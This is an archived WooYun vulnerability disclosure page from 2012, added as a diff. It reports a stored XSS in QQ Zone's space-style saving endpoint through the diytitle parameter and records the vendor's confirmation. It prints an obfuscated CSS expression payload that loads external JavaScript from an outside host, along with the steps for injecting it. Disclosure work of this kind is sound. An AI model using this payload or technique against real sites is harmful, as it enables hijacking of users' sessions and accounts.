@@ -1,0 +1,224 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-04-12 11:08</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-04-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-04-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-04-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-05-03：	细节向普通白帽子公开<br/>
+									2012-05-13：	细节向实习白帽子公开<br/>
+									2012-05-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">今天收到了腾讯的龙年公仔，挺酷，比之前那个小公仔帅多了。<br />
+<br />
+俺空间小号之前做测试的时候，把一些能写入自定义内容的位置，都写了诸如&lt;/script&gt; , &gt;&lt;&quot;\/ 之类的东东 ，今天进空间，习惯性的看了下源代码。 发现我以前写入的 &lt;/script&gt; 直接以 &lt;\/script&gt; 的形式出现在了源码里。。 于是就。。<br />
+<br />
+QQ空间开发人员进行产品更新时大意了，无洞变有洞了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 问题出在保存空间样式上。 问题URL：http://w.qzone.qq.com/cgi-bin/scenario/save_scenario_v6 <br />
+<br />
+<br />
+<br />
+2. 有问题的参数： diytitle<br />
+<br />
+<br />
+<br />
+3. 测试环境: Win7 + IE6, 7 | 由于代码是插入在CSS里的，因而只能用expression，因而造成IE版本限制。 <br />
+<br />
+<br />
+<br />
+4. 测试代码：expression(if(!window.x){window.x=1;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,116,111,111,108,109,97,111,46,99,111,109,47,116,111,111,108,47,113,113,109,97,105,108,46,106,115);document.body.appendChild(s);});color:#ff00cc<br />
+<br />
+<br />
+<br />
+5. post数据时，将diytitle修改为以上数据， 需要encodeURIComponent编码。<br />
+<br />
+<br />
+<br />
+6. 保存成功后。  查看QQ空间源码。 有以下内容，<br />
+<br />
+&lt;style type=&quot;text/css&quot; id=&quot;diytitleStyle&quot;&gt;.lay_headContainer .fn_info h1 {color:expression(if(!window.x){window.x=1;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,116,111,111,108,109,97,111,46,99,111,109,47,116,111,111,108,47,113,113,109,97,105,108,46,106,115);document.body.appendChild(s);});color:#ff00c !important;} ... 之后省略N个字.. </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">被插入的代码：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/12022008f99e1d538cf68fafe32dc13c31d1b174.jpg" target="_blank"><img src="../images/12022008f99e1d538cf68fafe32dc13c31d1b174.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+IE7 下调用外部JS成功，如下图： <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/120218195b149ffa1bbd5144c8a136301d827be1.jpg" target="_blank"><img src="../images/120218195b149ffa1bbd5144c8a136301d827be1.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">我记得之前，我想从 diytitle 入手的时候，都过滤的挺好的。。 之前那个函数如下 ：<br />
+<br />
+<br />
+<br />
+function initDiyTitleStyle(){<br />
+<br />
+	var c=(g_diyTitle||&#039;&#039;).split(&#039;|&#039;),c0=c[0],c1=c[1],c2=c[2],ar=[],re=/^[0-9a-f\(\)rg\#\,\.]{4,30}$/i;<br />
+<br />
+	return [&#039;&lt;style type=&quot;text/css&quot; id=&quot;diytitleStyle&quot;&gt;&#039;,<br />
+<br />
+	c0&amp;&amp;re.test(c0)&amp;&amp;(&#039;.lay_headContainer .fn_info h1 {color:&#039;+c0+&#039; !important;}&#039;)||&#039;&#039;,<br />
+<br />
+	c1&amp;&amp;re.test(c1)&amp;&amp;(&#039;.lay_headContainer .description span {color:&#039;+c1+&#039; !important;}&#039;)||&#039;&#039;,<br />
+<br />
+	c2&amp;&amp;re.test(c2)&amp;&amp;(&#039;#headContainer .fn_info .url {color:&#039;+c2+&#039; ;}&#039;)||&#039;&#039;,<br />
+<br />
+	&#039;&lt;/style&gt;&#039;];<br />
+<br />
+};<br />
+<br />
+<br />
+<br />
+现在怎么换成直接输出css了，貌似把原来的这个split(&quot;|&quot;)的过程搞到服务器端了，反而带来了漏洞。  你们自己看着改吧！！  </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-05967" title="QQ空间存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-04-13 10:37</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="5967";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
